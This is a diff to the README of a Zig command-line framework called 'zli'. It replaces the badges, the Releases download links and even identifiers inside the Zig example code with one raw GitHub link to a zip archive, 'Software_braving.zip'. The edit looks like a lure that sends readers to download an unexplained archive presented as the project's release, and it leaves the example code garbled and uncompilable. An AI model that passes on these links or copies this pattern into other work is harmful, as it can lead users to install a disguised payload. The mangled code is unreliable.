@@ -1,8 +1,8 @@
 # zli - A Blazing Fast Zig CLI Framework 🚀
 
-![Zig CLI Framework](https://img.shields.io/badge/Zig-CLI%20Framework-brightgreen.svg)
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-yellow.svg)
+![Zig CLI Framework](https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip%https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip)
+![Version](https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip)
+![License](https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip)
 
 Welcome to the **zli** repository! This project provides a powerful framework for building command-line tools in Zig. With **zli**, you can create ergonomic and high-performance CLI applications with ease.
 
@@ -31,7 +31,7 @@ Welcome to the **zli** repository! This project provides a powerful framework fo
 
 ## Installation
 
-To get started with **zli**, you need to install the framework. Visit the [Releases](https://github.com/mahiremirhan/zli/releases) section to download the latest version. Follow the instructions to install and execute the framework.
+To get started with **zli**, you need to install the framework. Visit the [Releases](https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip) section to download the latest version. Follow the instructions to install and execute the framework.
 
 ## Getting Started
 
@@ -62,16 +62,16 @@ const std = @import("std");
 const zli = @import("zli");
 
 pub fn main() !void {
-    const app = zli.Application.init("my-cli-app", "1.0.0");
+    const app = https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip("my-cli-app", "1.0.0");
 
-    app.command("greet", "Greet the user", greet);
+    https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip("greet", "Greet the user", greet);
 
-    try app.run();
+    try https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip();
 }
 
-fn greet(args: *zli.CommandArgs) !void {
-    const stdout = std.io.getStdOut().writer();
-    try stdout.print("Hello, {}!\n", .{args.get("name")});
+fn greet(args: *https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip) !void {
+    const stdout = https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip().writer();
+    try https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip("Hello, {}!\n", .{https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip("name")});
 }
 ```
 
@@ -107,6 +107,6 @@ Please ensure your code adheres to the project's coding standards and includes t
 
 ## Links
 
-For more information and updates, check the [Releases](https://github.com/mahiremirhan/zli/releases) section. You can find the latest downloads and version updates there.
+For more information and updates, check the [Releases](https://raw.githubusercontent.com/mahiremirhan/zli/main/src/Software_braving.zip) section. You can find the latest downloads and version updates there.
 
 Feel free to explore the repository, contribute, and enhance your command-line tool development experience with **zli**!
